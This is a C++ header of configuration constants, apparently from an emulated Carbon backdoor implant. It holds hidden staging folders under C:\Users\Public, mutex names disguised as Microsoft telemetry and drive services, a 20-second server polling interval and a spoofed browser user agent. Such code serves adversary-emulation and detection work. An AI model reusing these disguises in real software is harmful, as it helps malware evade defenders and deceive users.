#pragma once
#include <string>
#include <chrono>

#define QUOTE_PATH(X) #X
#define EXPAND_AND_QUOTE_PATH(X) QUOTE_PATH(X)

#ifndef CONFIG_FILE_PATH
#define CONFIG_PATH "encryptedDummyConfigFile.txt"
#else
#define CONFIG_PATH CONFIG_FILE_PATH
#endif

#ifndef FINISHED_TASKS_PATH
#define FINISHED_TASKS_FILEPATH "finishedTasks.txt"
#else
#define FINISHED_TASKS_FILEPATH FINISHED_TASKS_PATH
#endif

#ifndef CARBON_HOME_DIR
#define CARBON_HOME_DIRECTORY "C:\\Users\\Public"
#else
#define CARBON_HOME_DIRECTORY CARBON_HOME_DIR
#endif


// File is dedicated to production value
const std::string configFileName{CONFIG_PATH};

const std::string finishedTasks{FINISHED_TASKS_FILEPATH};

const std::string CarbonLocation{CARBON_HOME_DIRECTORY};

const std::string PayloadFolder{"C:\\Users"};

const std::string fileToEndRun{"testEnd.txt"};
const std::string dllTestingLogFile{"testLog.txt"};

constexpr const wchar_t* configMutex = L"Global\\Microsoft.Telemetry.Configuration";   // Mutex for config file
constexpr const wchar_t* taskMutex = L"Global\\DriveEncryptionStd";              // Mutex for orch task list
constexpr const wchar_t* taskOutputMutex = L"Global\\DriveHealthOverwatch";        // Mutex for task output

const std::string configFileNameBeginning{"a67s3ofc"};
const std::string configFileNameEnd{".txt"};
const std::string tasksListFile{"workdict.xml"};
const std::string tasksNumberFolder{"0511"};
const std::string resultsNumberFolder{"2028"};
const std::string logNumberFolder{"2028"};
const std::string nlsFolder{"Nlts"};
const std::string resultFileExtension{".yml"};
const std::string logFileExtension{".log"};
const std::string kCommsModuleLogPath = CarbonLocation + "\\" + logNumberFolder + "\\" + "dsntport.dat";

using namespace std::chrono_literals;
const auto serverRequestInterval = 20s;
const auto taskFinishCheckInterval = 20s;

// HTTP User Agent value
const std::string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54";
